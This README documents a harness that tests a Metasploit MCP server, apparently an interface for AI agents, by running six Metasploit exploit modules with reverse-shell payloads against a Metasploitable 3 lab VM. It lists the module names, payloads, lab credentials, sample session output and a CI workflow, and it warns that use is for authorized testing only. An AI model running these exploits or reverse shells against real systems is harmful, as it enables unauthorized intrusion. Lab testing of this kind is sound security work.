# Metasploitable 3 Test Harness

## Overview

The Metasploitable 3 Test Harness is a comprehensive integration testing tool designed to validate the MetasploitMCP server against real vulnerable targets. It acts as an MCP client that exercises the full stack of the Metasploit MCP integration.

## Purpose

This harness serves multiple purposes:

1. **Integration Testing**: Validates that the MCP server correctly interacts with Metasploit Framework
2. **Real-World Validation**: Tests against actual vulnerable systems, not just mocks
3. **Exploit Coverage**: Ensures common exploit modules work through the MCP interface
4. **Regression Testing**: Catches breaking changes in the MCP server or Metasploit integration
5. **Documentation**: Provides working examples of exploit usage through the MCP protocol

## Architecture

```
┌─────────────────────┐
│  Test Harness       │
│  (MCP Client)       │
└──────────┬──────────┘
           │
           │ HTTP/JSON-RPC
           │
┌──────────▼──────────┐
│  MetasploitMCP      │
│  Server             │
└──────────┬──────────┘
           │
           │ RPC
           │
┌──────────▼──────────┐
│  Metasploit         │
│  Framework          │
└──────────┬──────────┘
           │
           │ Network
           │
┌──────────▼──────────┐
│  Metasploitable 3   │
│  (Target)           │
└─────────────────────┘
```

## Features

### Exploit Test Coverage

The harness includes test cases for the following Metasploitable 3 vulnerabilities:

1. **ProFTPD ModCopy Exec** (`exploit/unix/ftp/proftpd_modcopy_exec`)
   - Tests FTP service exploitation via mod_copy vulnerability
   - Expected user: www-data

2. **Apache Shellshock** (`exploit/multi/http/apache_mod_cgi_bash_env_exec`)
   - Tests Bash environment variable injection in CGI scripts
   - Expected user: www-data

3. **Drupal Drupageddon** (`exploit/multi/http/drupal_drupageddon`)
   - Tests SQL injection leading to RCE in Drupal
   - Expected user: www-data

4. **phpMyAdmin preg_replace** (`exploit/multi/http/phpmyadmin_preg_replace`)
   - Tests authenticated RCE in phpMyAdmin
   - Expected user: www-data
   - Requires credentials: root:sploitme

5. **Ruby on Rails ActionPack** (`exploit/multi/http/rails_actionpack_inline_exec`)
   - Tests ERB code injection in Rails
   - Expected user: chewbacca

6. **UnrealIRCd Backdoor** (`exploit/unix/irc/unreal_ircd_3281_backdoor`)
   - Tests IRC backdoor exploitation
   - Expected user: boba_fett

### Automated Testing Features

- **Session Detection**: Automatically detects when exploits create sessions
- **Session Verification**: Validates sessions by running commands (e.g., `id`)
- **Timing Metrics**: Tracks execution time for each test
- **Detailed Results**: Comprehensive reporting of successes, failures, and errors
- **Flexible Execution**: Run all tests or specific tests by name
- **Stop on Failure**: Option to halt testing after first failure

## Installation

### Prerequisites

1. **Python 3.10+**
   ```bash
   python3 --version
   ```

2. **Poetry** (for dependency management)
   ```bash
   curl -sSL https://install.python-poetry.org | python3 -
   ```

3. **Metasploit Framework**
   ```bash
   # Verify installation
   msfconsole --version
   ```

4. **Metasploitable 3 (Linux) VM**
   - Set up using Vagrant or download pre-built VM
   - See: https://github.com/rapid7/metasploitable3

### Setup

1. **Install dependencies:**
   ```bash
   cd /path/to/MetasploitMCP
   poetry install
   ```

2. **Start Metasploit RPC:**
   ```bash
   msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
   ```

3. **Configure environment:**
   ```bash
   export MSF_PASSWORD=yourpassword
   export MSF_SERVER=127.0.0.1
   export MSF_PORT=55553
   ```

4. **Start MetasploitMCP Server:**
   ```bash
   poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
   ```

## Usage

### Basic Usage

Run all tests against Metasploitable 3:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --lport 4444
```

### List Available Tests

See all available exploit tests:

```bash
poetry run python metasploitable3_test_harness.py --list-tests
```

Output:
```
Available Tests:
================================================================================
1. ProFTPD ModCopy Exec
   Description: ProFTPD 1.3.5 Mod_Copy Command Execution
   Module: exploit/unix/ftp/proftpd_modcopy_exec
   Payload: cmd/unix/reverse_perl
   Notes: FTP service exploit via mod_copy vulnerability

2. Apache Shellshock
   Description: Apache mod_cgi Bash Environment Variable Injection (Shellshock)
   Module: exploit/multi/http/apache_mod_cgi_bash_env_exec
   Payload: linux/x86/meterpreter/reverse_tcp
   Notes: Shellshock vulnerability in CGI scripts
...
```

### Run Specific Test

Run a single test by name:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --test "ProFTPD ModCopy Exec"
```

### Custom MCP Server

Connect to a different MCP server:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --mcp-url http://192.168.1.100:9000
```

### Stop on First Failure

Stop testing after the first failure:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --stop-on-failure
```

### Verbose Logging

Enable debug logging:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose
```

## Output

### Test Execution Output

```
================================================================================
Testing: ProFTPD ModCopy Exec
Description: ProFTPD 1.3.5 Mod_Copy Command Execution
Module: exploit/unix/ftp/proftpd_modcopy_exec
Payload: cmd/unix/reverse_perl
Notes: FTP service exploit via mod_copy vulnerability
================================================================================
Executing exploit...
Exploit execution result: {'success': True, 'data': 'Session 1 opened'}
Active sessions: {'success': True, 'data': 'Active sessions: 1'}
Detected session ID: 1
Session command result: {'success': True, 'data': 'uid=33(www-data)'}
✓ Test PASSED - Session established (ID: 1)
```

### Summary Report

```
################################################################################
TEST SUMMARY
################################################################################

Total Tests: 6
Passed: 5 ✓
Failed: 1 ✗
Success Rate: 83.3%
Total Duration: 45.67s

Detailed Results:
--------------------------------------------------------------------------------
✓ PASS | ProFTPD ModCopy Exec (7.23s)
      Session ID: 1
      User Info: uid=33(www-data) gid=33(www-data) groups=33(www-data)
✓ PASS | Apache Shellshock (8.45s)
      Session ID: 2
      User Info: uid=33(www-data) gid=33(www-data) groups=33(www-data)
✗ FAIL | Drupal Drupageddon (5.12s)
      Error: No session established
...
```

## Configuration

### Environment Variables

The harness respects the following environment variables:

- `MSF_PASSWORD`: Metasploit RPC password (default: "msf")
- `MSF_SERVER`: Metasploit RPC server (default: "127.0.0.1")
- `MSF_PORT`: Metasploit RPC port (default: "55553")
- `LOG_LEVEL`: Logging level (default: "INFO")

### Network Configuration

Ensure proper network connectivity:

1. **Metasploitable 3 VM**: Should be accessible from your testing machine
2. **LHOST**: Must be an IP that Metasploitable 3 can reach for reverse connections
3. **LPORT**: Ensure the port is not blocked by firewalls

### Example Network Setup

Using VirtualBox:

```
Host Machine (Kali Linux)
├── IP: 10.0.2.4
├── Network: NAT Network or Host-Only
└── Running: MetasploitMCP + Test Harness

Metasploitable 3 VM
├── IP: 10.0.2.15
├── Network: Same NAT Network or Host-Only
└── Services: All vulnerable services running
```

## Testing the Harness

The harness includes comprehensive unit and integration tests:

```bash
# Run harness tests
poetry run pytest tests/test_metasploitable3_harness.py -v

# Run with coverage
poetry run pytest tests/test_metasploitable3_harness.py -v --cov=metasploitable3_test_harness
```

### Test Coverage

The test suite covers:

- ✅ Data structure creation (ExploitTest, TestResult)
- ✅ MCP client initialization and configuration
- ✅ Tool calling with success and error responses
- ✅ Session detection from various output formats
- ✅ Test execution flow (success, failure, partial)
- ✅ Result aggregation and reporting
- ✅ Error handling (network, JSON, timeouts)
- ✅ Integration scenarios

## Troubleshooting

### Common Issues

#### 1. Connection Refused

```
Error: Connection refused to http://127.0.0.1:8085
```

**Solution:**
- Verify MetasploitMCP server is running
- Check the MCP server port with `--mcp-url`

#### 2. No Sessions Established

```
⚠ Test PARTIAL - Exploit ran but no session detected
```

**Possible causes:**
- Network connectivity issues
- Firewall blocking reverse connections
- Service not vulnerable on target
- Wrong LHOST/LPORT configuration

**Solution:**
- Verify network connectivity: `ping 10.0.2.15`
- Check LHOST is reachable from target
- Verify services are running: `nmap -sV 10.0.2.15`

#### 3. Metasploit RPC Not Connected

```
Error: Failed to connect to Metasploit RPC
```

**Solution:**
```bash
# Start msfrpcd
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553

# Verify it's running
netstat -tlnp | grep 55553
```

#### 4. Target Not Vulnerable

Some exploits may fail if the target has been patched or configured differently.

**Solution:**
- Verify you're using the stock Metasploitable 3 configuration
- Check the GitHub wiki for specific configuration requirements
- Some exploits (like Apache Continuum) require manual iptables configuration

### Debug Mode

Enable verbose logging to diagnose issues:

```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose
```

This will show:
- Detailed HTTP requests/responses
- MCP protocol messages
- Exploit execution details
- Session detection logic

## Security Considerations

⚠️ **WARNING**: This harness performs real exploitation attacks.

### Best Practices

1. **Authorized Testing Only**: Only use against systems you own or have explicit permission to test
2. **Isolated Network**: Run tests in isolated lab environments, never on production networks
3. **Clean Up**: Sessions may persist; clean up after testing
4. **Logging**: All actions are logged; review logs for security audit trails
5. **Credentials**: Use strong passwords for Metasploit RPC

### Legal Notice

Unauthorized access to computer systems is illegal. This tool is designed for:
- Authorized penetration testing
- Security research in controlled environments
- Educational purposes in lab settings

Users are solely responsible for ensuring proper authorization before use.

## Extending the Harness

### Adding New Exploit Tests

To add a new exploit test, edit `get_exploit_tests()` in the harness:

```python
def get_exploit_tests(self) -> List[ExploitTest]:
    return [
        # ... existing tests ...
        ExploitTest(
            name="My New Exploit",
            description="Description of the vulnerability",
            module="exploit/category/module_name",
            payload="payload/type/name",
            options={
                "RHOSTS": self.target_ip,
                "RPORT": "8080",
                "LHOST": self.lhost,
                "LPORT": str(self.lport),
                # Add other required options
            },
            expected_user="expected_username",
            notes="Additional notes about configuration"
        ),
    ]
```

### Customizing Test Behavior

Override methods in `Metasploitable3TestHarness`:

```python
class CustomTestHarness(Metasploitable3TestHarness):
    async def run_single_test(self, test: ExploitTest) -> TestResult:
        # Add custom pre-test logic
        logger.info("Running custom pre-test checks...")
        
        # Call parent implementation
        result = await super().run_single_test(test)
        
        # Add custom post-test logic
        if result.success:
            logger.info("Custom cleanup...")
        
        return result
```

## CI/CD Integration

### GitHub Actions Example

```yaml
name: Metasploitable 3 Integration Tests

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  integration-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install poetry
          poetry install
      
      - name: Start Metasploit RPC
        run: |
          msfrpcd -P test123 -S -a 127.0.0.1 -p 55553 &
          sleep 5
      
      - name: Start MCP Server
        run: |
          poetry run python MetasploitMCP.py --transport http --port 8085 &
          sleep 5
      
      - name: Run Integration Tests
        run: |
          poetry run python metasploitable3_test_harness.py \
            --target ${{ secrets.METASPLOITABLE3_IP }} \
            --lhost ${{ secrets.TEST_LHOST }} \
            --mcp-url http://127.0.0.1:8085
```

## Performance Considerations

- **Test Duration**: Each exploit test takes 5-15 seconds on average
- **Session Cleanup**: Consider cleaning up sessions between tests to avoid resource exhaustion
- **Parallel Testing**: Currently runs sequentially; parallel execution could be added
- **Network Latency**: Results may vary based on network conditions

## Contributions

We welcome contributions to the test harness:

1. **New Exploit Tests**: Add coverage for additional Metasploitable 3 vulnerabilities
2. **Improved Detection**: Enhance session detection logic
3. **Better Reporting**: Add more detailed output formats (JSON, HTML)
4. **Error Handling**: Improve robustness for edge cases

See [CONTRIBUTING.md](../CONTRIBUTING.md) for guidelines.

## References

- [Metasploitable 3 GitHub](https://github.com/rapid7/metasploitable3)
- [Metasploitable 3 Wiki](https://github.com/rapid7/metasploitable3/wiki)
- [Metasploit Framework](https://www.metasploit.com/)
- [Model Context Protocol](https://modelcontextprotocol.io/)
- [Metasploitable 3 Walkthrough](https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/)

## License

This harness is part of the MetasploitMCP project and is licensed under the MIT License.

---

**Version**: 1.0.0  
**Last Updated**: October 2025  
**Maintainer**: MetasploitMCP Contributors

